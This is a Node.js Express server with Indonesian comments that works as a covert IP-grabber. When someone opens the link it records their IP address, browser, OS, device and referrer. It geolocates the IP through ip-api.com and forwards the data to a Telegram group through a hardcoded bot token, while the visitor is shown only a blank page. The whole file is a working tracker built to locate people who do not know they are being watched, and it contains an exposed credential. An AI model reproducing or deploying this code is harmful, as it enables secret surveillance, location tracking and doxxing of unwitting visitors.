const express = require('express');
const axios = require('axios');
const useragent = require('useragent');
const requestIp = require('request-ip');
const path = require('path');

const app = express();

// Konfigurasi Telegram
const BOT_TOKEN = process.env.BOT_TOKEN || '8695389088:AAG50EJrPpc63dmAzMJhYseVOwVd-jN9Pxo';
const GROUP_ID = process.env.GROUP_ID || '-1003785527944'; // GANTI INI

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(requestIp.mw());

// Serve static files
app.use(express.static(path.join(__dirname, '../public')));

// TRACKING ENDPOINT
app.get('/', async (req, res) => {
  try {
    // Ambil data
    const ip = req.clientIp;
    const ua = useragent.parse(req.headers['user-agent']);
    const referer = req.get('Referrer') || 'Langsung';
    const timestamp = new Date().toISOString();
    
    // Data lengkap
    const visitorData = {
      ip: ip,
      userAgent: req.headers['user-agent'],
      browser: ua.family,
      version: ua.toVersion(),
      os: ua.os.toString(),
      device: ua.device.toString(),
      referer: referer,
      timestamp: timestamp,
      language: req.headers['accept-language']
    };
    
    // Coba ambil lokasi
    try {
      const locRes = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
      visitorData.location = locRes.data;
    } catch (locErr) {
      visitorData.location = { error: 'Gagal ambil lokasi' };
    }
    
    // ========== INI BAGIAN PANGGIL FUNGSI ==========
    // Kirim ke Telegram (panggil fungsi sendToTelegram)
    sendToTelegram(visitorData).catch(console.error);
    // ================================================
    
    // Kirim file HTML
    res.sendFile(path.join(__dirname, '../public/blank.html'));
    
  } catch (err) {
    console.error(err);
    res.sendFile(path.join(__dirname, '../public/blank.html'));
  }
});

// Endpoint tracking tambahan
app.get('/track', (req, res) => {
  res.json({ status: 'tracking' });
});

// ========== INI DIA FUNGSI SENDTOTELEGRAM ==========
// Fungsi kirim ke Telegram
async function sendToTelegram(data) {
  try {
    // Format pesan
    let message = `🔥 **VISITOR BARU DETECTED!** 🔥\n\n`;
    message += `**Waktu:** ${data.timestamp}\n`;
    message += `**IP:** ${data.ip}\n`;
    
    if (data.location && data.location.city) {
      message += `**Lokasi:** ${data.location.city}, ${data.location.country}\n`;
      message += `**ISP:** ${data.location.isp || 'Unknown'}\n`;
    }
    
    message += `**Browser:** ${data.browser} ${data.version}\n`;
    message += `**OS:** ${data.os}\n`;
    message += `**Device:** ${data.device}\n`;
    message += `**Referer:** ${data.referer}\n\n`;
    message += `🌐 *Powered By FahzDev*`;
    
    // ========== YANG INI DIUBAH ==========
    // Kirim ke GROUP, bukan ke pribadi
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: GROUP_ID, // GANTI DARI ADMIN_ID JADI GROUP_ID
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    // ======================================
    
  } catch (err) {
    console.error('Gagal kirim ke Telegram:', err.message);
  }
}
// ====================================================

// Export untuk Vercel
module.exports = app;
